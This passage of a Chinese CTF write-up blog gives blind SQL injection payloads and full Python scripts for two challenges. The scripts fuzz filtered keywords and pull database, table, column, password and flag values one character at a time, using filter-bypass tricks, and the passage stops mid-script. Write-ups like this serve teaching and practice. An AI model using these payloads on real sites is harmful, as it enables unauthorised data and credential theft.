+<h5 id="0x04-实例讲解"><a href="#0x04-实例讲解" class="headerlink" title="0x04 实例讲解"></a>0x04 实例讲解</h5><h6 id="1-ascii盲注来自skctf-login3的一道题目："><a href="#1-ascii盲注来自skctf-login3的一道题目：" class="headerlink" title="1. ascii盲注来自skctf login3的一道题目："></a>1. ascii盲注来自skctf login3的一道题目：</h6><h6 id="题目链接：http-123-206-31-85-49167"><a href="#题目链接：http-123-206-31-85-49167" class="headerlink" title="题目链接：http://123.206.31.85:49167/"></a>题目链接：<a href="http://123.206.31.85:49167/" target="_blank" rel="noopener">http://123.206.31.85:49167/</a></h6><h6 id="这里最后是要注入出admin的password，过程就不详细讲解了，直接给出payload："><a href="#这里最后是要注入出admin的password，过程就不详细讲解了，直接给出payload：" class="headerlink" title="这里最后是要注入出admin的password，过程就不详细讲解了，直接给出payload："></a>这里最后是要注入出admin的password，过程就不详细讲解了，直接给出payload：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username = admin&apos;^(ascii(mid((password)from(1)))&gt;1)^(&apos;2&apos;&gt;&apos;1&apos;)%23</span><br></pre></td></tr></table></figure>
+
+<h6 id="下面是脚本："><a href="#下面是脚本：" class="headerlink" title="下面是脚本："></a>下面是脚本：</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">filter_arr=[</span><br><span class="line">    <span class="string">'='</span>,</span><br><span class="line">    <span class="string">' '</span>,</span><br><span class="line">    <span class="string">'and'</span>,</span><br><span class="line">    <span class="string">'or'</span>,</span><br><span class="line">    <span class="string">'&gt;'</span>,</span><br><span class="line">    <span class="string">'&lt;'</span>,</span><br><span class="line">    <span class="string">'^'</span>,</span><br><span class="line">    <span class="string">'table_schema'</span>,</span><br><span class="line">    <span class="string">'table_name'</span>,</span><br><span class="line">    <span class="string">'column_name'</span>,</span><br><span class="line">    <span class="string">'--'</span>,</span><br><span class="line">    <span class="string">'&amp;'</span>,</span><br><span class="line">    <span class="string">'|'</span>,</span><br><span class="line">    <span class="string">'\\'</span>,</span><br><span class="line">    <span class="string">'union'</span>,</span><br><span class="line">    <span class="string">'select'</span>,</span><br><span class="line">    <span class="string">'from'</span>,</span><br><span class="line">    <span class="string">'like'</span>,</span><br><span class="line">    <span class="string">'in'</span>,</span><br><span class="line">    <span class="string">'regex'</span>,</span><br><span class="line">    <span class="string">'||'</span>,</span><br><span class="line">    <span class="string">'&amp;&amp;'</span>,</span><br><span class="line">    <span class="string">'*'</span>,</span><br><span class="line">    <span class="string">'('</span>,</span><br><span class="line">    <span class="string">')'</span>,</span><br><span class="line">    <span class="string">'for'</span>,</span><br><span class="line">    <span class="string">'mid'</span>,</span><br><span class="line">    <span class="string">'ascii'</span>,</span><br><span class="line">    <span class="string">'\''</span>,</span><br><span class="line">    <span class="string">'"'</span>,</span><br><span class="line">    <span class="string">'`'</span>,</span><br><span class="line">    <span class="string">'substring'</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">filter_str= <span class="string">"1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ &#123;&#125;+-*/="</span></span><br><span class="line">requests=requests.session()</span><br><span class="line">url=<span class="string">"http://123.206.31.85:49167/index.php"</span></span><br><span class="line">username=<span class="string">'admin'</span></span><br><span class="line">password=<span class="string">'admin'</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fuzz</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,username,password,fuzz_arr,fuzz_str)</span>:</span></span><br><span class="line">        self.username=username</span><br><span class="line">        self.password=password</span><br><span class="line">        self.fuzz_arr=fuzz_arr</span><br><span class="line">        self.fuzz_str=fuzz_str</span><br><span class="line">        self.headers=&#123;</span><br><span class="line">            <span class="string">"User-Agent"</span>:<span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"</span>,</span><br><span class="line">            <span class="string">"Accept"</span>:<span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span>,</span><br><span class="line">            <span class="string">"Accept-Language"</span>:<span class="string">"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"</span>,</span><br><span class="line">            <span class="string">"Accept-Encoding"</span>:<span class="string">"gzip, deflate"</span>,</span><br><span class="line">            <span class="string">"Content-Type"</span>:<span class="string">"application/x-www-form-urlencoded"</span>,</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reqFuzz</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(self.fuzz_arr)):</span><br><span class="line">            datas=&#123;</span><br><span class="line">                <span class="string">"username"</span>:self.username+<span class="string">"'"</span>+self.fuzz_arr[i],</span><br><span class="line">                <span class="string">"password"</span>:self.password</span><br><span class="line">            &#125;</span><br><span class="line">            response=requests.post(url=url,data=datas,headers=self.headers)</span><br><span class="line">            <span class="keyword">if</span> len(response.text)==<span class="number">830</span>:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"[+]------没有过滤的关键值是 "</span>+self.fuzz_arr[i]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reqDatabasere</span><span class="params">(self)</span>:</span></span><br><span class="line">        resutlt = <span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">            flag=<span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> self.fuzz_str:</span><br><span class="line">                playlod = <span class="string">"admin'^(ascii(mid((database())from(&#123;&#125;)))&lt;&gt;&#123;&#125;)^0#"</span>.format(str(i), ord(j))</span><br><span class="line">                data = &#123;</span><br><span class="line">                    <span class="string">"username"</span>: playlod,</span><br><span class="line">                    <span class="string">"password"</span>: <span class="string">"admin"</span></span><br><span class="line">                &#125;</span><br><span class="line">                s = requests.post(url, data)</span><br><span class="line">                <span class="keyword">if</span> len(s.text) == <span class="number">821</span>:</span><br><span class="line">                    resutlt += j</span><br><span class="line">                    flag = <span class="number">1</span></span><br><span class="line">                    print(resutlt)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> flag==<span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reqPassword</span><span class="params">(self)</span>:</span></span><br><span class="line">        resutlt = <span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">40</span>):</span><br><span class="line">            flag = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> self.fuzz_str:</span><br><span class="line">                playlod = <span class="string">"admin'^(ascii(mid((select(password)from(admin))from(&#123;&#125;)))&lt;&gt;&#123;&#125;)^0#"</span>.format(str(i + <span class="number">1</span>), ord(j))</span><br><span class="line">                data = &#123;</span><br><span class="line">                    <span class="string">"username"</span>: playlod,</span><br><span class="line">                    <span class="string">"password"</span>: self.password</span><br><span class="line">                &#125;</span><br><span class="line">                s = requests.post(url, data)</span><br><span class="line">                print(playlod)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">"error"</span> <span class="keyword">in</span> s.text:</span><br><span class="line">                    resutlt += j</span><br><span class="line">                    flag = <span class="number">1</span></span><br><span class="line">                    print(<span class="string">'**************************'</span>, resutlt)</span><br><span class="line">            <span class="keyword">if</span> flag == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">    fuzz = Fuzz(username, password, filter_arr,filter_str)</span><br><span class="line">    fuzz.reqPassword()</span><br></pre></td></tr></table></figure>
+
+<h5 id="2-regex-盲注是来自实验吧的一道注入题目："><a href="#2-regex-盲注是来自实验吧的一道注入题目：" class="headerlink" title="2. regex 盲注是来自实验吧的一道注入题目："></a>2. regex 盲注是来自实验吧的一道注入题目：</h5><h6 id="题目链接：http-ctf5-shiyanbar-com-web-earnest-index-php"><a href="#题目链接：http-ctf5-shiyanbar-com-web-earnest-index-php" class="headerlink" title="题目链接：http://ctf5.shiyanbar.com/web/earnest/index.php"></a>题目链接：<a href="http://ctf5.shiyanbar.com/web/earnest/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/earnest/index.php</a></h6><h6 id="这道题只有一个id作为输入点，id存在注入点，但是过滤了很多东西，前面的步骤就不详细说了，去看p牛的详细解答看到这里，过滤了-，但是没过滤-，所以xor注入就无效了，这边选择regexp注入使用-符号从后往前注入。"><a href="#这道题只有一个id作为输入点，id存在注入点，但是过滤了很多东西，前面的步骤就不详细说了，去看p牛的详细解答看到这里，过滤了-，但是没过滤-，所以xor注入就无效了，这边选择regexp注入使用-符号从后往前注入。" class="headerlink" title="这道题只有一个id作为输入点，id存在注入点，但是过滤了很多东西，前面的步骤就不详细说了，去看p牛的详细解答看到这里，过滤了^，但是没过滤$，所以xor注入就无效了，这边选择regexp注入使用$符号从后往前注入。"></a>这道题只有一个id作为输入点，id存在注入点，但是过滤了很多东西，前面的步骤就不详细说了，去看p牛的详细解答看到这里，过滤了^，但是没过滤$，所以xor注入就无效了，这边选择regexp注入使用$符号从后往前注入。</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&apos; or (select (select fl$4g from fiag limit 1) regexp &apos;%s$&apos;) or &apos;pcat&apos;=&apos;</span><br></pre></td></tr></table></figure>
+
+<h6 id="下面是另外一种方法："><a href="#下面是另外一种方法：" class="headerlink" title="下面是另外一种方法："></a>下面是另外一种方法：</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">filter_arr=[</span><br><span class="line">    <span class="string">'='</span>,</span><br><span class="line">    <span class="string">' '</span>,</span><br><span class="line">    <span class="string">'and'</span>,</span><br><span class="line">    <span class="string">'or'</span>,</span><br><span class="line">    <span class="string">'&gt;'</span>,</span><br><span class="line">    <span class="string">'&lt;'</span>,</span><br><span class="line">    <span class="string">'^'</span>,</span><br><span class="line">    <span class="string">'table_schema'</span>,</span><br><span class="line">    <span class="string">'table_name'</span>,</span><br><span class="line">    <span class="string">'column_name'</span>,</span><br><span class="line">    <span class="string">'--'</span>,</span><br><span class="line">    <span class="string">'&amp;'</span>,</span><br><span class="line">    <span class="string">'|'</span>,</span><br><span class="line">    <span class="string">'\\'</span>,</span><br><span class="line">    <span class="string">'union'</span>,</span><br><span class="line">    <span class="string">'select'</span>,</span><br><span class="line">    <span class="string">'from'</span>,</span><br><span class="line">    <span class="string">'like'</span>,</span><br><span class="line">    <span class="string">'in'</span>,</span><br><span class="line">    <span class="string">'regex'</span>,</span><br><span class="line">    <span class="string">'||'</span>,</span><br><span class="line">    <span class="string">'&amp;&amp;'</span>,</span><br><span class="line">    <span class="string">'*'</span>,</span><br><span class="line">    <span class="string">'('</span>,</span><br><span class="line">    <span class="string">')'</span>,</span><br><span class="line">    <span class="string">'for'</span>,</span><br><span class="line">    <span class="string">'mid'</span>,</span><br><span class="line">    <span class="string">'ascii'</span>,</span><br><span class="line">    <span class="string">'\''</span>,</span><br><span class="line">    <span class="string">'"'</span>,</span><br><span class="line">    <span class="string">'`'</span>,</span><br><span class="line">    <span class="string">'substring'</span>,</span><br><span class="line">    <span class="string">','</span>,</span><br><span class="line">    <span class="string">'#'</span>,</span><br><span class="line">    <span class="string">'+'</span>,</span><br><span class="line">    <span class="string">'substr'</span>,</span><br><span class="line">    <span class="string">'$'</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">filter_str= <span class="string">"1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ &#123;&#125;+-*/=_@$~!"</span></span><br><span class="line">requests=requests.session()</span><br><span class="line">url=<span class="string">"http://ctf5.shiyanbar.com/web/earnest/index.php"</span></span><br><span class="line">id=<span class="string">"0"</span></span><br><span class="line">submit=<span class="string">"%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2"</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fuzz</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,id,submit,fuzz_arr,fuzz_str,len)</span>:</span></span><br><span class="line">        self.id=id</span><br><span class="line">        self.submit=submit</span><br><span class="line">        self.fuzz_arr=fuzz_arr</span><br><span class="line">        self.fuzz_str=fuzz_str</span><br><span class="line">        self.len=len</span><br><span class="line">        self.headers=&#123;</span><br><span class="line">            <span class="string">"User-Agent"</span>:<span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"</span>,</span><br><span class="line">            <span class="string">"Accept"</span>:<span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span>,</span><br><span class="line">            <span class="string">"Accept-Language"</span>:<span class="string">"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"</span>,</span><br><span class="line">            <span class="string">"Accept-Encoding"</span>:<span class="string">"gzip, deflate"</span>,</span><br><span class="line">            <span class="string">"Content-Type"</span>:<span class="string">"application/x-www-form-urlencoded"</span>,</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reqFuzz</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(self.fuzz_arr)):</span><br><span class="line">            datas=&#123;</span><br><span class="line">                <span class="string">"id"</span>:self.id+<span class="string">"'"</span>+self.fuzz_arr[i],</span><br><span class="line">                <span class="string">"submit"</span>:self.submit</span><br><span class="line">            &#125;</span><br><span class="line">            response=requests.post(url=url,data=datas,headers=self.headers)</span><br><span class="line">            <span class="keyword">if</span> len(response.text)!=<span class="number">584</span>:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"[+]------没有过滤的关键值是 "</span>+self.fuzz_arr[i]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reqDatabaseLen</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            datas=&#123;</span><br><span class="line">                <span class="string">"id"</span>:self.id+<span class="string">"'"</span>+<span class="string">"oorr(length(database())=%s)oorr'0"</span>%i,</span><br><span class="line">                <span class="string">"submit"</span>:self.submit</span><br><span class="line">            &#125;</span><br><span class="line">            response=requests.post(url=url,data=datas)</span><br><span class="line">            <span class="keyword">if</span> len(response.text)==self.len:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"the length of database is %s"</span>%i</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reqDatabase</span><span class="params">(self)</span>:</span></span><br><span class="line">        result=<span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">19</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> self.fuzz_str:</span><br><span class="line">                datas=&#123;</span><br><span class="line">                    <span class="string">"id"</span>:self.id+<span class="string">"'"</span>+<span class="string">"oorr((mid((database())from(%s)foorr(1)))='%s')oorr'0"</span>%(i,j),</span><br><span class="line">                    <span class="string">"submit"</span>:self.submit</span><br><span class="line">                &#125;</span><br><span class="line">                response=requests.post(url,data=datas)</span><br><span class="line">                <span class="keyword">if</span> len(response.text)==self.len:</span><br><span class="line">                    result+=j</span><br><span class="line">                    <span class="keyword">print</span> result</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reqTableLen</span><span class="params">(self)</span>:</span></span><br><span class="line">        i=<span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            payload=<span class="string">"0'oorr((select(mid(group_concat(table_name separatoorr '@')from(%s)foorr(1)))from(infoorrmation_schema.tables)where(table_schema)=database())='')oorr'0"</span>%i</span><br><span class="line">            <span class="comment"># 由于空格的过滤我们可以用0x0a来替代</span></span><br><span class="line">            payload=payload.replace(<span class="string">' '</span>,chr(<span class="number">0x0a</span>))</span><br><span class="line">            datas=&#123;</span><br><span class="line">                <span class="string">"id"</span>:payload,</span><br><span class="line">                <span class="string">"submit"</span>:self.submit</span><br><span class="line">            &#125;</span><br><span class="line">            response=requests.post(url=url,data=datas)</span><br><span class="line">            <span class="keyword">if</span> len(response.text)==self.len:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"[+]------the length of tables is %s"</span>%i</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            i+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reqTables</span><span class="params">(self)</span>:</span></span><br><span class="line">        result=<span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">12</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> self.fuzz_str:</span><br><span class="line">                payload = <span class="string">"0'oorr((select(mid(group_concat(table_name separatoorr '@')from(%s)foorr(1)))from(infoorrmation_schema.tables)where(table_schema)=database())='%s')oorr'0"</span> % (</span><br><span class="line">                i, j)</span><br><span class="line">                payload = payload.replace(<span class="string">' '</span>, chr(<span class="number">0x0a</span>))</span><br><span class="line">                key = &#123;</span><br><span class="line">                    <span class="string">'id'</span>: payload,</span><br><span class="line">                    <span class="string">'submit'</span>:self.submit</span><br><span class="line">                &#125;</span><br><span class="line">                r = requests.post(url, data=key)</span><br><span class="line">                <span class="keyword">if</span> len(r.text)==self.len:</span><br><span class="line">                    result += j</span><br><span class="line">                    <span class="keyword">print</span> result</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"[+]------数据库的表为"</span>+result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reqColumnLen</span><span class="params">(self)</span>:</span></span><br><span class="line">        i = <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            flag = <span class="string">"0'oorr((select(mid(group_concat(column_name separatoorr '@')from(%s)foorr(1)))from(infoorrmation_schema.columns)where(table_name)='fiag')='')oorr'0"</span> % i</span><br><span class="line">            flag = flag.replace(<span class="string">' '</span>, chr(<span class="number">0x0a</span>))</span><br><span class="line">            key = &#123;</span><br><span class="line">                <span class="string">'id'</span>: flag,</span><br><span class="line">                <span class="string">'submit'</span>:self.submit</span><br><span class="line">            &#125;</span><br><span class="line">            r = requests.post(url, data=key)</span><br><span class="line">            <span class="keyword">if</span> len(r.text)==self.len:</span><br><span class="line">                print(<span class="string">'the length of columns is %s'</span> % i)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reqColumns</span><span class="params">(self)</span>:</span></span><br><span class="line">        result = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">6</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> self.fuzz_str:</span><br><span class="line">                flag = <span class="string">"0'oorr((select(mid(group_concat(column_name separatoorr '@')from(%s)foorr(1)))from(infoorrmation_schema.columns)where(table_name)='fiag')='%s')oorr'0"</span> % (</span><br><span class="line">                i, j)</span><br><span class="line">                flag = flag.replace(<span class="string">' '</span>, chr(<span class="number">0x0a</span>))</span><br><span class="line">                key = &#123;</span><br><span class="line">                    <span class="string">'id'</span>: flag,</span><br><span class="line">                    <span class="string">'submit'</span>:self.submit</span><br><span class="line">                &#125;</span><br><span class="line">                r = requests.post(url, data=key)</span><br><span class="line">                <span class="keyword">if</span> len(r.text)==self.len:</span><br><span class="line">                    result += j</span><br><span class="line">                    print(j)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        print(result)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reqColumnData</span><span class="params">(self)</span>:</span></span><br><span class="line">        i = <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            flag = <span class="string">"0'oorr((select(mid((fl$4g)from(%s)foorr(1)))from(fiag))='')oorr'0"</span> % i</span><br><span class="line">            flag = flag.replace(<span class="string">' '</span>, chr(<span class="number">0x0a</span>))</span><br><span class="line">            key = &#123;<span class="string">'id'</span>: flag&#125;</span><br><span class="line">            r = requests.post(url, data=key)</span><br><span class="line">            print(key)</span><br><span class="line">            <span class="keyword">if</span> len(r.text) == self.len:</span><br><span class="line">                print(<span class="string">'the length of data is %s'</span> % i)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reqFlag</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment"># 这里的空格会转换成-</span></span><br><span class="line">        <span class="comment"># 跑出来的flag&#123;haha~you-win!&#125;</span></span><br><span class="line">        <span class="comment"># 所以真正的flag&#123;haha~you win!&#125;</span></span><br><span class="line">        data = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> self.fuzz_str:</span><br><span class="line">                flag = <span class="string">"0'oorr((select(mid((fl$4g)from(%s)foorr(1)))from(fiag))='%s')oorr'0"</span> % (i, j)</span><br><span class="line">                flag = flag.replace(<span class="string">' '</span>, chr(<span class="number">0x0a</span>))</span><br><span class="line">                key = &#123;<span class="string">'id'</span>: flag&#125;</span><br><span class="line">                r = requests.post(url, data=key)</span><br><span class="line">                